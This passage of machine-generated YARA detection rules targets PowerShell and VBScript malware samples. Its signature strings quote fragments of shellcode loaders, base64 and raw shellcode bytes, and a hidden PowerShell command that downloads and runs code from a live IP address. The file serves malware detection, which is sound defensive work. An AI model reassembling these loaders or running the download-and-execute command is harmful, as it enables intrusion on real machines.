      $s14 = "ATgApACwAIAAkAHMASABbACQATgBOAF0ALAAgADEAKQB9ADsAJABjAEUAOgA6AEMAcgBlAGEAdABlAFQAaAByAGUAYQBkACgAMAAsADAALAAkAHMASABWACwAMAAsADA" ascii /* base64 encoded string 'N ) ,   $ s H [ $ N N ] ,   1 ) } ; $ c E : : C r e a t e T h r e a d ( 0 , 0 , $ s H V , 0 , 0' */ /* score: '21.00'*/
      $s15 = "ALAAwAHgANQA3ACwAMAB4ADUAMwAsADAAeAA1ADYALAAwAHgANgA4ACwAMAB4AGUAYgAsADAAeAA1ADUALAAwAHgAMgBlACwAMAB4ADMAYgAsADAAeABmAGYALAAwAHg" ascii /* base64 encoded string ', 0 x 5 7 , 0 x 5 3 , 0 x 5 6 , 0 x 6 8 , 0 x e b , 0 x 5 5 , 0 x 2 e , 0 x 3 b , 0 x f f , 0 x' */ /* score: '21.00'*/
      $s16 = "AMAAwACwAMAB4ADAAMAAsADAAeAA2ADgALAAwAHgAMAAwACwAMAB4ADAAMAAsADAAeAA0ADAALAAwAHgAMAAwACwAMAB4ADUAMwAsADAAeAA2ADgALAAwAHgANQA4ACw" ascii /* base64 encoded string '0 0 , 0 x 0 0 , 0 x 6 8 , 0 x 0 0 , 0 x 0 0 , 0 x 4 0 , 0 x 0 0 , 0 x 5 3 , 0 x 6 8 , 0 x 5 8 ,' */ /* score: '21.00'*/
      $s17 = "AMAB4ADIAZQAsADAAeAAzADEALAAwAHgAMwA5ACwAMAB4ADMAOAAsADAAeAAyAGUALAAwAHgAMwA3ACwAMAB4ADMAOAAsADAAeAAyAGUALAAwAHgAMwAxACwAMAB4ADM" ascii /* base64 encoded string '0 x 2 e , 0 x 3 1 , 0 x 3 9 , 0 x 3 8 , 0 x 2 e , 0 x 3 7 , 0 x 3 8 , 0 x 2 e , 0 x 3 1 , 0 x 3' */ /* score: '21.00'*/
      $s18 = "AZAA1ACwAMAB4ADkANgAsADAAeAA2AGEALAAwAHgAMABhACwAMAB4ADUAZgAsADAAeAA1ADMALAAwAHgANQAzACwAMAB4ADUAMwAsADAAeAA1ADMALAAwAHgANQA2ACw" ascii /* base64 encoded string 'd 5 , 0 x 9 6 , 0 x 6 a , 0 x 0 a , 0 x 5 f , 0 x 5 3 , 0 x 5 3 , 0 x 5 3 , 0 x 5 3 , 0 x 5 6 ,' */ /* score: '21.00'*/
      $s19 = "AYgAsADAAeAAwADEALAAwAHgAZAA2ACwAMAB4ADMAMQAsADAAeABjADAALAAwAHgAYQBjACwAMAB4AGMAMQAsADAAeABjAGYALAAwAHgAMABkACwAMAB4ADAAMQAsADA" ascii /* base64 encoded string 'b , 0 x 0 1 , 0 x d 6 , 0 x 3 1 , 0 x c 0 , 0 x a c , 0 x c 1 , 0 x c f , 0 x 0 d , 0 x 0 1 , 0' */ /* score: '21.00'*/
      $s20 = "ANQAsADAAeAAxADYALAAwAHgANgA4ACwAMAB4ADgAOAAsADAAeAAxADMALAAwAHgAMAAwACwAMAB4ADAAMAAsADAAeAA2ADgALAAwAHgANAA0ACwAMAB4AGYAMAAsADA" ascii /* base64 encoded string '5 , 0 x 1 6 , 0 x 6 8 , 0 x 8 8 , 0 x 1 3 , 0 x 0 0 , 0 x 0 0 , 0 x 6 8 , 0 x 4 4 , 0 x f 0 , 0' */ /* score: '21.00'*/
   condition:
      uint16(0) == 0x733c and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule sig_35f634a00e48d1431c6845e2b72fdc79b373e7d905c6a79b0ed4755b4e8b023b {
   meta:
      description = "mw - file 35f634a00e48d1431c6845e2b72fdc79b373e7d905c6a79b0ed4755b4e8b023b"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "35f634a00e48d1431c6845e2b72fdc79b373e7d905c6a79b0ed4755b4e8b023b"
   strings:
      $s1 = "$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAll" ascii /* score: '27.00'*/
      $s2 = "$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAll" ascii /* score: '27.00'*/
      $s3 = "$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Locatio" ascii /* score: '24.00'*/
      $s4 = "n.Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')" fullword ascii /* score: '24.00'*/
      $s5 = "$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([Int" ascii /* score: '15.00'*/
      $s6 = "return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((" ascii /* score: '15.00'*/
      $s7 = "start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job" fullword ascii /* score: '15.00'*/
      $s8 = "$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([Int" ascii /* score: '15.00'*/
      $s9 = "function func_get_proc_address {" fullword ascii /* score: '12.00'*/
      $s10 = "3Pam4yyn4CIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FeUEtzKsiIjI8rqIiMjy6jc3NwMTkJTDFUbDRsTDGlCVUJwQFFK" ascii /* score: '11.00'*/
      $s11 = "$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string" ascii /* score: '11.00'*/
      $s12 = "IvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNL" ascii /* score: '11.00'*/
      $s13 = "WUpPT0IMFg0TAwt0Sk1HTFRQA213AxUNEhgDdEpNFRcYA1sVFwoDYlNTT0Z0RkFoSlcMFhAUDRAVAwtoa3dubw8DT0pIRgNkRkBITAoDYEtRTE5GDBUUDRMNEBAaFQ0U" ascii /* score: '11.00'*/
      $s14 = "GgNwQkVCUUoMFhAUDRAVLikjX7FHHJwLz2asaWk4ucv+xJxG0vEp8blIAyxb1I4fCWJfxZVH2kckBBE+vgg+hTqFQ+WVmRRFzVQPziNL05aBddz2SWNLIzMjI0sjI2Mj" ascii /* score: '11.00'*/
      $s15 = "VEpNSndLb1QFJNz2Etx0dHR0dEsZdVqE3PbKpyMjI3gS6nJySSBycktzIyMjcHNLdKq85dz2yFN4EvFxSyMhY6dxcXFwcXNLyHYNGNz2quWg4HMS3HR0SdxwdUsOJTtY" ascii /* score: '11.00'*/
      $s16 = "$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string" ascii /* score: '11.00'*/
      $s17 = "Set-StrictMode -Version 2" fullword ascii /* score: '11.00'*/
      $s18 = "U1cjcD/HX2m2fHHrUtFaBcvpmbB/15JjCzDFEvhZhHIfI2ZXaWgbOL+wxzZEXnezq7zsaWTe6fCTE6YOI2JAQEZTVxkDQlNTT0pAQldKTE0MW0tXTk8IW05PDwNCU1NP" ascii /* score: '11.00'*/
      $s19 = "[Byte[]]$var_code = [System.Convert]::FromBase64String('38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEf" ascii /* score: '11.00'*/
      $s20 = "[Byte[]]$var_code = [System.Convert]::FromBase64String('38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEf" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x6553 and filesize < 10KB and
      8 of them
}

rule c01068e733eb7056b1c9c6ec8692c379c28fa775445755ee913153ca2e69fc6b {
   meta:
      description = "mw - file c01068e733eb7056b1c9c6ec8692c379c28fa775445755ee913153ca2e69fc6b"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "c01068e733eb7056b1c9c6ec8692c379c28fa775445755ee913153ca2e69fc6b"
   strings:
      $s1 = "$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAll" ascii /* score: '27.00'*/
      $s2 = "$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAll" ascii /* score: '27.00'*/
      $s3 = "$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Locatio" ascii /* score: '24.00'*/
      $s4 = "n.Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')" fullword ascii /* score: '24.00'*/
      $s5 = "$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([Int" ascii /* score: '15.00'*/
      $s6 = "return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((" ascii /* score: '15.00'*/
      $s7 = "$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([Int" ascii /* score: '15.00'*/
      $s8 = "function func_get_proc_address {" fullword ascii /* score: '12.00'*/
      $s9 = "$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string" ascii /* score: '11.00'*/
      $s10 = "$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string" ascii /* score: '11.00'*/
      $s11 = "GvJW+3tnqGMHaiLzRWKoL2tnqGM/aiLzYqgnq2si82J7Ynt9enlie2J6YnlroM8DYnHcw3tienlrqDHKaNzc3H5qnVRQEXwQESMjYnVqqsVros+DIiMjaqrGap8hIzen" ascii /* score: '11.00'*/
      $s12 = "7VbGy7AjIyNroM8za6rBbhLqSSdie2uq2mKZIfrrfNz2oNsjXXZroOcDfarVSWNieksjMyMjYntrqtFrEupimXuHcMbc9muq4Gqq5G4S6mqq02uq+Wuq2mKZIfrrfNz2" ascii /* score: '11.00'*/
      $s13 = "A2Li6i5iIuLBznFicmuocQOoYR9rIvNFols7KCEsplEjIyOoo6sjIyNrpuNXRGsi86hrO3NnqGMDaiLzwHVuEupr3OpiqBerayL1axLjYuLqLo9iIuIbw1bSbyBvBytm" ascii /* score: '11.00'*/
      $s14 = "[Byte[]]$var_code = [System.Convert]::FromBase64String('32ugx9PL7yMjI2JyYnNxcnVrEvFGa6hxQ2uocTtrqHEDa6hRc2sslGlpbhLqaxLjjx9CXyEP" ascii /* score: '11.00'*/
      $s15 = "bmnlF2J3aqrHb6rSYplvVAUk3PZvqslLIiIjI3pimQqjSCPc9kkpYn1zc24S6m4S42vc42uq4Wvc42uq4mKZySz8w9z2a6rkSTNie2+qwWuq2mKZuoZXQtz2puNXKWrc" ascii /* score: '11.00'*/
      $s16 = "$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementa" ascii /* score: '10.00'*/
      $s17 = "return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((" ascii /* score: '10.00'*/
      $s18 = "[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)" fullword ascii /* score: '10.00'*/
      $s19 = "[Byte[]]$var_code = [System.Convert]::FromBase64String('32ugx9PL7yMjI2JyYnNxcnVrEvFGa6hxQ2uocTtrqHEDa6hRc2sslGlpbhLqaxLjjx9CXyEP" ascii /* score: '10.00'*/
      $s20 = "oc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 8KB and
      8 of them
}

rule sig_44b65f19cc2ad9f897269fb9b02b9266718e9bd911e67ca0fb48b638d3627a6c {
   meta:
      description = "mw - file 44b65f19cc2ad9f897269fb9b02b9266718e9bd911e67ca0fb48b638d3627a6c"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "44b65f19cc2ad9f897269fb9b02b9266718e9bd911e67ca0fb48b638d3627a6c"
   strings:
      $x1 = "objShell.Run \"powershell.exe -NoProfile -WindowStyle Hidden -Command \"\"iex ((New-Object System.Net.WebClient).DownloadString(" ascii /* score: '43.00'*/
      $x2 = "objShell.Run \"powershell.exe -NoProfile -WindowStyle Hidden -Command \"\"iex ((New-Object System.Net.WebClient).DownloadString(" ascii /* score: '35.00'*/
      $s3 = "Set objShell = CreateObject(\"Wscript.Shell\")" fullword ascii /* score: '12.00'*/
      $s4 = "tp://94.131.108.208:8000/fetcher'))\"\"\", 0, True" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x6553 and filesize < 1KB and
      1 of ($x*) and all of them
}

rule sig_4549cb2e8379c4ebe89d845e669c54bf84ca05f594fc58a8cf81436188a9ce0a {
   meta:
      description = "mw - file 4549cb2e8379c4ebe89d845e669c54bf84ca05f594fc58a8cf81436188a9ce0a"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "4549cb2e8379c4ebe89d845e669c54bf84ca05f594fc58a8cf81436188a9ce0a"
   strings:
      $s1 = "[DllImport(\"kernel32.dll\")]" fullword ascii /* score: '19.00'*/
      $s2 = "public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter," ascii /* score: '13.00'*/
      $s3 = "public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter," ascii /* score: '13.00'*/
      $s4 = "$kcPeXZXxVBF = Add-Type -memberDefinition $aSENnmlI -Name \"Win32\" -namespace Win32Functions -passthru" fullword ascii /* score: '11.00'*/
      $s5 = "[System.Runtime.InteropServices.Marshal]::Copy($juzfytNGBOpHp,0,$jabjeMhPDYTGZ,$juzfytNGBOpHp.Length)" fullword ascii /* score: '10.00'*/
      $s6 = "$kcPeXZXxVBF::CreateThread(0,0,$jabjeMhPDYTGZ,0,0,0)" fullword ascii /* score: '7.00'*/
      $s7 = " uint dwCreationFlags, IntPtr lpThreadId);" fullword ascii /* score: '7.00'*/
      $s8 = "public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);" fullword ascii /* score: '6.00'*/
      $s9 = "$aSENnmlI = @\"" fullword ascii /* score: '4.00'*/
      $s10 = "[Byte[]] $juzfytNGBOpHp = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x65,0x48,0x8b," ascii /* score: '4.00'*/
      $s11 = "$jabjeMhPDYTGZ = $kcPeXZXxVBF::VirtualAlloc(0,[Math]::Max($juzfytNGBOpHp.Length,0x1000),0x3000,0x40)" fullword ascii /* score: '4.00'*/
      $s12 = "[Byte[]] $juzfytNGBOpHp = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x65,0x48,0x8b," ascii /* score: '4.00'*/
      $s13 = "8,0x1,0xd6,0x48,0x31,0xc0,0x41,0xc1,0xc9,0xd,0xac,0x41,0x1,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x39,0xd1,0x75,0" ascii /* score: '1.00'*/
      $s14 = "0x58,0x48,0x89,0xf9,0x41,0xba,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40," ascii /* score: '1.00'*/
      $s15 = ",0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,0xff,0xd5,0x" ascii /* score: '1.00'*/
      $s16 = "0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0xf" ascii /* score: '1.00'*/
      $s17 = "0x3c,0x48,0x1,0xd0,0x66,0x81,0x78,0x18,0xb,0x2,0xf,0x85,0x72,0x0,0x0,0x0,0x8b,0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67,0x4" ascii /* score: '1.00'*/
      $s18 = "8,0x41,0x58,0x5e,0x48,0x1,0xd0,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x" ascii /* score: '1.00'*/
      $s19 = "x49,0x89,0xc7,0x4d,0x31,0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0" ascii /* score: '1.00'*/
      $s20 = "85,0xc0,0x74,0xa,0x49,0xff,0xce,0x75,0xe5,0xe8,0x93,0x0,0x0,0x0,0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9,0x6a,0x4,0x41," ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x6124 and filesize < 9KB and
      8 of them
}

rule sig_84e917adbd398c3758c2dda4b348f2604c24075bf4986f37cf11a6e7c6ee44c6 {
   meta:
      description = "mw - file 84e917adbd398c3758c2dda4b348f2604c24075bf4986f37cf11a6e7c6ee44c6"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "84e917adbd398c3758c2dda4b348f2604c24075bf4986f37cf11a6e7c6ee44c6"
   strings:
      $s1 = "[DllImport(\"kernel32.dll\")]" fullword ascii /* score: '19.00'*/
      $s2 = "public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter," ascii /* score: '13.00'*/
      $s3 = "public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter," ascii /* score: '13.00'*/
      $s4 = "$bUcPxgvJjtVli = Add-Type -memberDefinition $KlXuDUWkaMyixq -Name \"Win32\" -namespace Win32Functions -passthru" fullword ascii /* score: '11.00'*/
      $s5 = "[System.Runtime.InteropServices.Marshal]::Copy($hboVDnmMPF,0,$UecuKmLuXEMMEJ,$hboVDnmMPF.Length)" fullword ascii /* score: '10.00'*/
      $s6 = " uint dwCreationFlags, IntPtr lpThreadId);" fullword ascii /* score: '7.00'*/
      $s7 = "$bUcPxgvJjtVli::CreateThread(0,0,$UecuKmLuXEMMEJ,0,0,0)" fullword ascii /* score: '7.00'*/
      $s8 = "public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);" fullword ascii /* score: '6.00'*/
      $s9 = "$KlXuDUWkaMyixq = @\"" fullword ascii /* score: '4.00'*/
      $s10 = "[Byte[]] $hboVDnmMPF = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x4" ascii /* score: '4.00'*/
      $s11 = "[Byte[]] $hboVDnmMPF = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x4" ascii /* score: '4.00'*/
      $s12 = "$UecuKmLuXEMMEJ = $bUcPxgvJjtVli::VirtualAlloc(0,[Math]::Max($hboVDnmMPF.Length,0x1000),0x3000,0x40)" fullword ascii /* score: '4.00'*/
      $s13 = "0xec,0xa0,0x1,0x0,0x0,0x49,0x89,0xe5,0x49,0xbc,0x2,0x0,0x11,0xc3,0x92,0xbe,0x30,0xe5,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x4" ascii /* score: '1.00'*/
      $s14 = "0xc0,0x74,0xa,0x49,0xff,0xce,0x75,0xe5,0xe8,0x93,0x0,0x0,0x0,0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9,0x6a,0x4,0x41,0x5" ascii /* score: '1.00'*/
      $s15 = "x1,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x1,0xd0,0xe3,0x56,0x4d,0x31,0xc9,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0" ascii /* score: '1.00'*/
      $s16 = "x1,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x39,0xd1,0x75,0xd8" ascii /* score: '1.00'*/
      $s17 = "c0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0xe2,0xed,0x52,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x41,0x5" ascii /* score: '1.00'*/
      $s18 = ",0x89,0xc7,0x4d,0x31,0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7d" ascii /* score: '1.00'*/
      $s19 = "8,0x48,0x89,0xf9,0x41,0xba,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x4" ascii /* score: '1.00'*/
      $s20 = "a,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x49,0xff,0xce,0xe9,0x3c,0xff,0xff,0xff,0x48,0x1,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x" ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x4b24 and filesize < 9KB and
      8 of them
}

rule b5a4977adcb122b2972b3e4566beaf85385bd12ceee14e594d4432e0195c5710 {
   meta:
      description = "mw - file b5a4977adcb122b2972b3e4566beaf85385bd12ceee14e594d4432e0195c5710"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "b5a4977adcb122b2972b3e4566beaf85385bd12ceee14e594d4432e0195c5710"
   strings:
      $s1 = "[DllImport(\"kernel32.dll\")]" fullword ascii /* score: '19.00'*/
      $s2 = "public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter," ascii /* score: '13.00'*/
      $s3 = "public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter," ascii /* score: '13.00'*/
      $s4 = "$oFRhAKTavnYb = Add-Type -memberDefinition $FXmMaGdPR -Name \"Win32\" -namespace Win32Functions -passthru" fullword ascii /* score: '11.00'*/
      $s5 = "[System.Runtime.InteropServices.Marshal]::Copy($zfLjmKLdDRz,0,$DqTwsDjtZ,$zfLjmKLdDRz.Length)" fullword ascii /* score: '10.00'*/
      $s6 = " uint dwCreationFlags, IntPtr lpThreadId);" fullword ascii /* score: '7.00'*/
      $s7 = "$oFRhAKTavnYb::CreateThread(0,0,$DqTwsDjtZ,0,0,0)" fullword ascii /* score: '7.00'*/
      $s8 = "public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);" fullword ascii /* score: '6.00'*/
      $s9 = "[Byte[]] $zfLjmKLdDRz = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x51,0x48,0x31,0xd2,0x56,0x65,0x" ascii /* score: '4.00'*/
      $s10 = "$DqTwsDjtZ = $oFRhAKTavnYb::VirtualAlloc(0,[Math]::Max($zfLjmKLdDRz.Length,0x1000),0x3000,0x40)" fullword ascii /* score: '4.00'*/
      $s11 = "[Byte[]] $zfLjmKLdDRz = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x51,0x48,0x31,0xd2,0x56,0x65,0x" ascii /* score: '4.00'*/
      $s12 = "$FXmMaGdPR = @\"" fullword ascii /* score: '4.00'*/
      $s13 = "0xc0,0x74,0xa,0x49,0xff,0xce,0x75,0xe5,0xe8,0x93,0x0,0x0,0x0,0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9,0x6a,0x4,0x41,0x5" ascii /* score: '1.00'*/
      $s14 = ",0x89,0xc7,0x4d,0x31,0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7d" ascii /* score: '1.00'*/
      $s15 = "8,0x48,0x89,0xf9,0x41,0xba,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x4" ascii /* score: '1.00'*/
      $s16 = "a,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x49,0xff,0xce,0xe9,0x3c,0xff,0xff,0xff,0x48,0x1,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x" ascii /* score: '1.00'*/
      $s17 = ",0x28,0x58,0x41,0x57,0x59,0x68,0x0,0x40,0x0,0x0,0x41,0x58,0x6a,0x0,0x5a,0x41,0xba,0xb,0x2f,0xf,0x30,0xff,0xd5,0x57,0x59,0x41,0xb" ascii /* score: '1.00'*/
      $s18 = "df,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85," ascii /* score: '1.00'*/
      $s19 = "41,0xff,0xe7,0x58,0x6a,0x0,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5" fullword ascii /* score: '1.00'*/
      $s20 = "1,0x59,0x68,0x0,0x10,0x0,0x0,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,0xc9,0x41,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,0x49" ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x4624 and filesize < 9KB and
      8 of them
}

rule bd9dafd9a575b5cb77bae553a5277d335b84f0d2aca4d7f684b14baf98d3d3ae {
   meta:
      description = "mw - file bd9dafd9a575b5cb77bae553a5277d335b84f0d2aca4d7f684b14baf98d3d3ae"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "bd9dafd9a575b5cb77bae553a5277d335b84f0d2aca4d7f684b14baf98d3d3ae"
   strings:
      $s1 = "[DllImport(\"kernel32.dll\")]" fullword ascii /* score: '19.00'*/
      $s2 = "public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter," ascii /* score: '13.00'*/
      $s3 = "public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter," ascii /* score: '13.00'*/
      $s4 = "$dTeMMOvePPgovxv = Add-Type -memberDefinition $RQQibwXYzlt -Name \"Win32\" -namespace Win32Functions -passthru" fullword ascii /* score: '11.00'*/
      $s5 = "[System.Runtime.InteropServices.Marshal]::Copy($JTlRGFdlQ,0,$AVrSTKRRZKGEXg,$JTlRGFdlQ.Length)" fullword ascii /* score: '10.00'*/
      $s6 = " uint dwCreationFlags, IntPtr lpThreadId);" fullword ascii /* score: '7.00'*/
      $s7 = "$dTeMMOvePPgovxv::CreateThread(0,0,$AVrSTKRRZKGEXg,0,0,0)" fullword ascii /* score: '7.00'*/
      $s8 = "public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);" fullword ascii /* score: '6.00'*/
      $s9 = "[Byte[]] $JTlRGFdlQ = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x51,0x65,0x48,0x8b" ascii /* score: '4.00'*/
      $s10 = "[Byte[]] $JTlRGFdlQ = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x51,0x65,0x48,0x8b" ascii /* score: '4.00'*/
      $s11 = "$AVrSTKRRZKGEXg = $dTeMMOvePPgovxv::VirtualAlloc(0,[Math]::Max($JTlRGFdlQ.Length,0x1000),0x3000,0x40)" fullword ascii /* score: '4.00'*/
      $s12 = "$RQQibwXYzlt = @\"" fullword ascii /* score: '4.00'*/
